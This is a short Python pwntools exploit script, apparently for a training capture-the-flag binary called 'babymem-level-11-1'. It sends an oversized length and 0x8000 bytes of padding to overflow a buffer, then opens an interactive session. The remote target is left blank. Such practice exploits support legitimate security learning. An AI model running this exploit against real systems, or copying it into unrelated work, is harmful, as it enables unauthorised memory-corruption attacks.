#!/usr/bin/python3
from pwn import *

# context.log_level = 'debug'
exe = context.binary = ELF('/challenge/./babymem-level-11-1', checksec=False)


def GDB(): gdb.attach(p, gdbscript='''


c
''') if not args.REMOTE else None

p = remote('', ) if args.REMOTE else process(argv=[exe.path], aslr=False)

if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT
# ===========================================================

pl =  b'A' * 0x8000
p.sendline(b'500000')
#p.sendline(b'10')
p.send(pl)
p.interactive()


